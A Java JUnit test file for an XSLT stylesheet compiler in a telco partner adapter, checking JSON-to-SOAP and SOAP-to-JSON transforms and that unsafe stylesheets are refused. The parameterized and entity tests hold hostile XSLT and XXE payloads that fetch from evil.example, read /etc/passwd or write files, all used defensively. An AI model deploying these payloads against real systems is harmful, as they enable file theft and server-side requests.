package mfs.mw.adapter.telco.partner.mapping;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.github.tomakehurst.wiremock.WireMockServer;
import com.github.tomakehurst.wiremock.core.WireMockConfiguration;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Element;

/**
 * The XSLT of a SOAP partner record (ticket 85): compiled once, never reaching outside the
 * stylesheet (no document(), entity, include or extension), and the two transforms mw-soap-call
 * runs: the request JSON (XPath 3.1 XML form) to the SOAP body element, and the SOAP body (or a
 * fault) to the JSON mw-classify maps.
 */
class CompiledStylesheetTest {

  static final String XSL_HEAD =
      "<xsl:stylesheet version=\"3.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\""
          + " xmlns:fn=\"http://www.w3.org/2005/xpath-functions\" xmlns:b=\"urn:biller\" exclude-result-prefixes=\"fn\">";

  static final String REQUEST = XSL_HEAD + """
        <xsl:template match="/fn:map">
          <b:Pay><b:bill><xsl:value-of select="fn:string[@key='bill']"/></b:bill><b:ref><xsl:value-of select="fn:string[@key='ref']"/></b:ref></b:Pay>
        </xsl:template>
      </xsl:stylesheet>
      """;

  static final String RESPONSE = XSL_HEAD + """
        <xsl:output method="json"/>
        <xsl:template match="/b:PayResponse">
          <xsl:sequence select="map{'receipt': string(b:receipt)}"/>
        </xsl:template>
        <xsl:template match="/*:fault">
          <xsl:sequence select="map{'fault': string(@code), 'code': string(*:detail/b:code)}"/>
        </xsl:template>
      </xsl:stylesheet>
      """;

  @Test
  void theRequestJsonBecomesTheSoapBodyElement() {
    Element body = CompiledStylesheet.compile(REQUEST).requestElement("{\"bill\":\"B-1\",\"ref\":\"BITS1\"}");

    assertThat(body.getNamespaceURI()).isEqualTo("urn:biller");
    assertThat(body.getLocalName()).isEqualTo("Pay");
    assertThat(body.getTextContent()).isEqualTo("B-1BITS1");
  }

  @Test
  void theSoapBodyBecomesJson() {
    String json = CompiledStylesheet.compile(RESPONSE)
        .responseJson("<b:PayResponse xmlns:b=\"urn:biller\"><b:receipt>R-9</b:receipt></b:PayResponse>");

    assertThat(json).isEqualTo("{\"receipt\":\"R-9\"}");
  }

  @Test
  void aFaultIsTransformedByTheSameStylesheet() {
    String json = CompiledStylesheet.compile(RESPONSE).faultJson("Client", null, "Bill not found",
        "<detail><b:code xmlns:b=\"urn:biller\">3001</b:code></detail>");

    assertThat(json).isEqualTo("{\"fault\":\"Client\",\"code\":\"3001\"}");
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "<xsl:template match='/'><xsl:copy-of select=\"document('http://evil.example/x')\"/></xsl:template>",
      "<xsl:template match='/'><xsl:copy-of select=\"doc ('http://evil.example/x')\"/></xsl:template>",
      "<xsl:template match='/'><xsl:value-of select=\"unparsed-text('file:///etc/passwd')\"/></xsl:template>",
      "<xsl:template match='/'><xsl:copy-of select=\"collection('file:///etc')\"/></xsl:template>",
      "<xsl:template match='/'><xsl:copy-of select=\"function-lookup(xs:QName('fn:doc'), 1)('x')\"/></xsl:template>",
      "<xsl:template match='/' expand-text='yes'>{json-doc('http://evil.example/x')}</xsl:template>",
      "<xsl:include href='http://evil.example/x.xsl'/>",
      "<xsl:import href='classpath:other.xsl'/>",
      "<xsl:template match='/'><xsl:result-document href='file:///tmp/x'><a/></xsl:result-document></xsl:template>",
      "<xsl:template match='/'><xsl:source-document href='http://evil.example/x'><a/></xsl:source-document></xsl:template>",
      "<xsl:template match='/'><xsl:evaluate xpath=\"'1'\"/></xsl:template>"
  })
  void aStylesheetThatReachesOutsideItselfIsRefused(String body) {
    String xsl = XSL_HEAD + body + "</xsl:stylesheet>";

    assertThat(StylesheetPolicy.problems(xsl)).isNotEmpty();
    assertThatThrownBy(() -> CompiledStylesheet.compile(xsl)).isInstanceOf(IllegalArgumentException.class);
  }

  @Test
  void anExternalEntityInTheStylesheetIsRefusedBeforeItIsResolved() {
    WireMockServer probe = new WireMockServer(WireMockConfiguration.options().dynamicPort());
    probe.start();
    try {
      String xsl = "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"http://localhost:" + probe.port() + "/x\">]>"
          + XSL_HEAD + "<xsl:template match='/'><a>&e;</a></xsl:template></xsl:stylesheet>";

      assertThat(StylesheetPolicy.problems(xsl)).anyMatch(p -> p.contains("DOCTYPE"));
      assertThatThrownBy(() -> CompiledStylesheet.compile(xsl)).isInstanceOf(IllegalArgumentException.class);
      assertThat(probe.getAllServeEvents()).isEmpty();
    } finally {
      probe.stop();
    }
  }

  @Test
  void aPartnerAnswerWithAnExternalEntityIsNotParsed() {
    WireMockServer probe = new WireMockServer(WireMockConfiguration.options().dynamicPort());
    probe.start();
    try {
      CompiledStylesheet response = CompiledStylesheet.compile(RESPONSE);
      String evil = "<!DOCTYPE b:PayResponse [<!ENTITY e SYSTEM \"http://localhost:" + probe.port() + "/x\">]>"
          + "<b:PayResponse xmlns:b=\"urn:biller\"><b:receipt>&e;</b:receipt></b:PayResponse>";

      assertThatThrownBy(() -> response.responseJson(evil)).isInstanceOf(IllegalArgumentException.class);
      assertThat(probe.getAllServeEvents()).isEmpty();
    } finally {
      probe.stop();
    }
  }

  @Test
  void aStylesheetThatDoesNotCompileIsRefusedWithItsReason() {
    assertThatThrownBy(() -> CompiledStylesheet.compile(XSL_HEAD + "<xsl:template match='/'><xsl:value-of select='('/>"
        + "</xsl:template></xsl:stylesheet>"))
        .isInstanceOf(IllegalArgumentException.class)
        .hasMessageContaining("does not compile");
  }

  @Test
  void aTransformThatFailsAtRunTimeIsAnIllegalArgument() {
    CompiledStylesheet failing = CompiledStylesheet.compile(XSL_HEAD
        + "<xsl:template match='/'><xsl:sequence select=\"error((), 'no')\"/></xsl:template></xsl:stylesheet>");

    assertThatThrownBy(() -> failing.responseJson("<a/>")).isInstanceOf(IllegalArgumentException.class);
  }
}
